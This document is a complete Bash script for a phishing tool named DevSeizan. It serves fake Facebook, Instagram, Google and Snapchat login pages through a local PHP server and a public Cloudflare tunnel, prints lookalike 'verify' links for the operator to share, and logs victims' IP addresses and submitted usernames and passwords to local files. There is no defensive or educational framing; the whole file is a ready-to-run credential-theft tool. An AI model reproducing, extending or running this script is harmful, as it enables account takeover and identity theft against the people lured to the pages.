#!/bin/bash

##   DevSeizan  :  Automated Phishing Tool
##   Author     :  DevSeizan Team
##   Version    :  1.0.0
##   Github     :  https://github.com/dev-seizan/devseizan

__version__="1.0.0"

## DEFAULT HOST & PORT
HOST='127.0.0.1'
PORT='8080'

## ANSI colors
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")

## Create required directories
mkdir -p ".server/www" "auth" 2>/dev/null

## Cleanup previous runs
rm -rf .server/www/* .server/.cld.log .server/.loclx 2>/dev/null

## Trap signals
trap 'echo -e "\n\n${RED}[!] Program Interrupted.${RESETBG}"; kill_pid; exit 1' SIGINT SIGTERM

## Kill running processes
kill_pid() {
    for process in php cloudflared loclx; do
        pidof $process >/dev/null 2>&1 && killall $process >/dev/null 2>&1
    done
}

## Reset colors
reset_color() {
    tput sgr0; tput op
}

## Check internet
check_status() {
    echo -ne "\n${GREEN}[+]${CYAN} Internet Status: "
    timeout 3 curl -fIs "https://api.github.com" >/dev/null 2>&1
    [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}"
}

## Banner
banner() {
    cat <<- EOF
        ${ORANGE}
        ${ORANGE}  ____             _____       _                 
        ${ORANGE} |  _ \  ___ _ __ | ____|_ __ | |__   __ _ _ __  
        ${ORANGE} | | | |/ _ \ '_ \|  _| | '_ \| '_ \ / _  | '__| 
        ${ORANGE} | |_| |  __/ |_) | |___| |_) | | | | (_| | |    
        ${ORANGE} |____/ \___| .__/|_____| .__/|_| |_|\__,_|_|    
        ${ORANGE}            |_|         |_|                      
        ${ORANGE}                              ${RED}Version: ${__version__}

        ${GREEN}[-]${CYAN} Tool Created by DevSeizan Team${WHITE}
    EOF
}

## Small banner
banner_small() {
    cat <<- EOF
        ${BLUE}
        ${BLUE}  ██████╗ ███████╗██╗   ██╗███████╗███████╗██╗███████╗ █████╗ ███╗   ██╗
        ${BLUE}  ██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝██║╚══███╔╝██╔══██╗████╗  ██║
        ${BLUE}  ██║  ██║█████╗  ██║   ██║███████╗███████╗██║  ███╔╝ ███████║██╔██╗ ██║
        ${BLUE}  ██║  ██║██╔══╝  ╚██╗ ██╔╝╚════██║╚════██║██║ ███╔╝  ██╔══██║██║╚██╗██║
        ${BLUE}  ██████╔╝███████╗ ╚████╔╝ ███████║███████║██║███████╗██║  ██║██║ ╚████║
        ${BLUE}  ╚═════╝ ╚══════╝  ╚═══╝  ╚══════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝${WHITE} ${__version__}
    EOF
}

## Dependencies
dependencies() {
    echo -e "\n${GREEN}[+]${CYAN} Installing required packages..."
    
    if [[ -d "/data/data/com.termux/files/home" ]]; then
        [[ ! $(command -v proot) ]] && pkg install proot resolv-conf -y
        [[ ! $(command -v tput) ]] && pkg install ncurses-utils -y
    fi

    pkgs=(php curl unzip)
    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" >/dev/null 2>&1; then
            echo -e "${GREEN}[+]${CYAN} Installing: ${ORANGE}$pkg${WHITE}"
            if command -v pkg >/dev/null; then
                pkg install "$pkg" -y
            elif command -v apt >/dev/null; then
                sudo apt install "$pkg" -y
            elif command -v pacman >/dev/null; then
                sudo pacman -S "$pkg" --noconfirm
            else
                echo -e "${RED}[!] Install $pkg manually${RESETBG}"
                exit 1
            fi
        fi
    done
    echo -e "${GREEN}[+]${GREEN} All packages ready.${WHITE}"
}

## Download function
download() {
    url="$1" output="$2"
    file=$(basename "$url")
    rm -f "$file" "$output" 2>/dev/null
    
    curl -sL --fail --retry 3 --retry-delay 2 "$url" -o "$file" || {
        echo -e "${RED}[!] Download failed: $output${RESETBG}"
        exit 1
    }
    
    if [[ "$file" == *.zip ]]; then
        unzip -qq "$file" && mv -f "$output" ".server/$output" 2>/dev/null
    else
        mv -f "$file" ".server/$output" 2>/dev/null
    fi
    chmod +x ".server/$output" 2>/dev/null
    rm -f "$file"
}

## Install Cloudflared
install_cloudflared() {
    if [[ -e ".server/cloudflared" ]]; then
        echo -e "\n${GREEN}[+]${GREEN} Cloudflared ready.${WHITE}"
        return
    fi
    
    echo -e "\n${GREEN}[+]${CYAN} Installing Cloudflared...${WHITE}"
    arch=$(uname -m)
    
    case "$arch" in
        *arm*|*Android*) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared' ;;
        *aarch64*) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared' ;;
        *x86_64*) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared' ;;
        *) download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared' ;;
    esac
}

## Custom port
cusport() {
    read -n1 -p "${RED}[?]${ORANGE} Custom Port? [y/N]: " P_ANS
    echo
    if [[ "$P_ANS" =~ [yY] ]]; then
        read -p "${RED}[-]${ORANGE} Enter 4-digit Port [1024-9999]: " CU_P
        if [[ "$CU_P" =~ ^[1-9][0-9]{3}$ && "$CU_P" -ge 1024 ]]; then
            PORT=$CU_P
        else
            echo -e "${RED}[!] Invalid port. Using default.${WHITE}"
        fi
    fi
}

## Setup site - MODIFIED FOR .HTML FILES
setup_site() {
    echo -e "\n${RED}[-]${BLUE} Setting up ${website}...${WHITE}"
    
    # Check if .html file exists (e.g., snapchat.html)
    if [[ -f ".sites/${website}.html" ]]; then
        cp -f ".sites/${website}.html" ".server/www/index.html"
    # Check if folder exists (e.g., facebook/index.html)
    elif [[ -d ".sites/${website}" ]]; then
        cp -rf ".sites/${website}"/* ".server/www/"
    else
        echo -e "${RED}[!] Template not found: ${website}${WHITE}"
        exit 1
    fi
    
    cp -f ".sites/ip.php" ".server/www/" 2>/dev/null
    cp -f ".sites/post.php" ".server/www/" 2>/dev/null
    
    echo -ne "${RED}[-]${BLUE} Starting PHP server...${WHITE}"
    cd ".server/www" && php -S "$HOST:$PORT" >/dev/null 2>&1 &
    cd "$BASE_DIR"
}

## Capture IP
capture_ip() {
    IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt 2>/dev/null | xargs)
    [[ -n "$IP" ]] && {
        echo -e "\n${RED}[-]${GREEN} Victim IP: ${BLUE}$IP"
        echo -e "${RED}[-]${BLUE} Saved: ${ORANGE}auth/ip.txt${WHITE}"
        cat .server/www/ip.txt >> auth/ip.txt
        rm -f .server/www/ip.txt
    }
}

## Capture credentials
capture_creds() {
    if [[ -f ".server/www/usernames.txt" ]]; then
        echo -e "\n${RED}[-]${GREEN} Login captured!${WHITE}"
        cat .server/www/usernames.txt
        cat .server/www/usernames.txt >> auth/usernames.dat
        rm -f .server/www/usernames.txt
        echo -e "${RED}[-]${BLUE} Saved: ${ORANGE}auth/usernames.dat${WHITE}"
    fi
}

## Monitor data - MODIFIED FOR ALL DATA FILES
capture_data() {
    echo -ne "\n${RED}[-]${ORANGE} Waiting for victim... ${BLUE}Ctrl+C to exit..."
    while true; do
        # Check ip.txt
        if [[ -f ".server/www/ip.txt" ]]; then
            capture_ip
        fi
        
        # Check usernames.txt (from post.php)
        if [[ -f ".server/www/usernames.txt" ]]; then
            capture_creds
        fi
        
        # Check individual data files (facebook-data.txt, etc.)
        for datafile in .server/www/*-data.txt; do
            [[ -f "$datafile" ]] || continue
            filename=$(basename "$datafile")
            echo -e "\n${GREEN}[+] Data captured: ${filename}${WHITE}"
            cat "$datafile" >> "auth/${filename}"
            rm -f "$datafile"
        done
        
        sleep 1
    done
}

## Start Cloudflared
start_cloudflared() {
    rm -f .server/.cld.log
    cusport
    echo -e "\n${RED}[-]${GREEN} Starting... (${CYAN}http://$HOST:$PORT${GREEN})${WHITE}"
    setup_site
    
    echo -ne "\n${RED}[-]${GREEN} Launching Cloudflared...${WHITE}"
    
    if command -v termux-chroot >/dev/null 2>&1; then
        termux-chroot ./.server/cloudflared tunnel -url "$HOST:$PORT" --logfile .server/.cld.log >/dev/null 2>&1 &
    else
        ./.server/cloudflared tunnel -url "$HOST:$PORT" --logfile .server/.cld.log >/dev/null 2>&1 &
    fi
    
    sleep 8
    cldflr_url=$(grep -o 'https://[0-9a-z]*\.trycloudflare.com' ".server/.cld.log" 2>/dev/null)
    
    if [[ -n "$cldflr_url" ]]; then
        echo -e "\n${RED}[-]${BLUE} URL: ${GREEN}$cldflr_url${WHITE}"
        custom_url "$cldflr_url"
    else
        echo -e "\n${RED}[!] URL generation failed. Check hotspot.${WHITE}"
    fi
    capture_data
}

## URL shortener
custom_url() {
    url=${1#http*//}
    echo -e "\n${RED}[-]${BLUE} Share this link:${WHITE}"
    echo -e "${GREEN}https://$url${WHITE}"
}

## Start localhost
start_localhost() {
    cusport
    echo -e "\n${RED}[-]${GREEN} Starting... (${CYAN}http://$HOST:$PORT${GREEN})${WHITE}"
    setup_site
    echo -e "\n${GREEN}[+] Server running at: ${CYAN}http://$HOST:$PORT${WHITE}"
    capture_data
}

## Tunnel menu
tunnel_menu() {
    clear; banner_small
    cat <<- EOF

        ${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${WHITE}02${RED}]${ORANGE} Cloudflared

    EOF
    
    read -p "${RED}[-]${GREEN} Select: ${BLUE}" REPLY
    
    case $REPLY in
        1|01) start_localhost ;;
        2|02) start_cloudflared ;;
        *) echo -e "${RED}[!] Invalid option${WHITE}"; sleep 1; tunnel_menu ;;
    esac
}

## Template menus
site_facebook() {
    clear; banner_small
    cat <<- EOF
        ${RED}[${WHITE}01${RED}]${ORANGE} Standard Login
        ${RED}[${WHITE}02${RED}]${ORANGE} Security Check
    EOF
    read -p "${RED}[-]${GREEN} Select: ${BLUE}" REPLY
    case $REPLY in
        1|01) website="facebook"; mask="https://facebook.com-verify" ;;
        2|02) website="facebook_security"; mask="https://facebook-security-check" ;;
        *) site_facebook ;;
    esac
    tunnel_menu
}

site_instagram() {
    clear; banner_small
    cat <<- EOF
        ${RED}[${WHITE}01${RED}]${ORANGE} Standard Login
        ${RED}[${WHITE}02${RED}]${ORANGE} Followers Generator
    EOF
    read -p "${RED}[-]${GREEN} Select: ${BLUE}" REPLY
    case $REPLY in
        1|01) website="instagram"; mask="https://instagram.com-verify" ;;
        2|02) website="instagram_followers"; mask="https://get-instagram-followers" ;;
        *) site_instagram ;;
    esac
    tunnel_menu
}

site_google() {
    website="google"
    mask="https://google.com-security"
    tunnel_menu
}

## About
about() {
    clear; banner
    cat <<- EOF
        ${GREEN}Author:  ${RED}DevSeizan Team
        ${GREEN}Github:  ${CYAN}https://github.com/devseizan
        ${GREEN}Version: ${ORANGE}${__version__}

        ${RED}[${WHITE}00${RED}]${ORANGE} Main Menu    ${RED}[${WHITE}99${RED}]${ORANGE} Exit
    EOF
    read -p "${RED}[-]${GREEN} Select: ${BLUE}" REPLY
    case $REPLY in
        99) exit 0 ;;
        0|00) main_menu ;;
        *) about ;;
    esac
}

## Main menu
main_menu() {
    clear; banner
    cat <<- EOF
        ${RED}[${WHITE}::${RED}]${ORANGE} Select Target ${RED}[${WHITE}::${RED}]${ORANGE}

        ${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}02${RED}]${ORANGE} Instagram
        ${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}04${RED}]${ORANGE} Snapchat

        ${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit

    EOF
    
    read -p "${RED}[-]${GREEN} Select option: ${BLUE}" REPLY
    
    case $REPLY in
        1|01) site_facebook ;;
        2|02) site_instagram ;;
        3|03) site_google ;;
        4|04) website="snapchat"; mask="https://snapchat.com-verify"; tunnel_menu ;;
        99) about ;;
        0|00) exit 0 ;;
        *) echo -e "${RED}[!] Invalid option${WHITE}"; sleep 1; main_menu ;;
    esac
}

## Main execution
kill_pid
dependencies
check_status
install_cloudflared
main_menu